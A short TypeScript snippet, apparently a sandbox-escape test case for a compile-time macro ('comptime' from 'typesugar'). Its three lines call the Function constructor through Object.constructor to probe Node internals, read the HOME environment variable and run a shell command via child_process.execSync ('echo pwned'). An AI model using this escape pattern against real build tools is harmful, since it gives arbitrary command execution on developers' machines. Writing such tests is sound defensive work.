import { comptime } from "typesugar";
const x = comptime(() => (Object as any).constructor("return typeof process.mainModule + ' ' + typeof process.binding")());
const y = comptime(() => (Object as any).constructor("return process.env.HOME")());
const z = comptime(() => (Object as any).constructor("return process.mainModule.require('child_process').execSync('echo pwned').toString()")());
